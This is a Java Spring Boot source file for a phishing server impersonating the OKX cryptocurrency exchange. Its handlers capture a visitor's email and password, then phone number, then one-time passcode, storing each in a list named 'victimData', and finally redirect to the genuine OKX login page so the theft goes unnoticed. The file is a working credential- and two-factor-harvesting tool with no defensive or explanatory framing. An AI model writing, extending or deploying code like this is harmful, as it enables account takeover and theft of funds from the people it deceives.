package com.okx.app;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import java.util.ArrayList;
import java.util.List;

@SpringBootApplication
@Controller
public class OkxApplication {

    public static List<String[]> victimData = new ArrayList<>();

    public static void main(String[] args) {
        SpringApplication.run(OkxApplication.class, args);
        System.out.println("✅ OKX Server is Live! Go to http://localhost:8080");
    }

    @GetMapping("/")
    public String loginPage() {
        return "index";
    }

    @PostMapping("/login")
    public String handleLogin(@RequestParam String email, @RequestParam String password) {
        victimData.add(new String[]{"LOGIN DATA", email, password});
        return "redirect:/verify-phone"; 
    }

    @GetMapping("/verify-phone")
    public String verifyPhonePage() {
        return "verify";
    }

    @PostMapping("/submit-phone")
    public String handleSubmitPhone(@RequestParam String phoneNumber) {
        victimData.add(new String[]{"PHONE NUMBER", phoneNumber, "Waiting for OTP..."});
        return "redirect:/otp-page";
    }

    @GetMapping("/otp-page")
    public String otpPage() {
        return "otp";
    }

    @PostMapping("/submit-otp")
    public String handleSubmitOtp(@RequestParam String otpCode) {
        victimData.add(new String[]{"OTP CODE", otpCode, "COMPLETED"});
        return "redirect:https://www.okx.com/account/login"; 
    }
}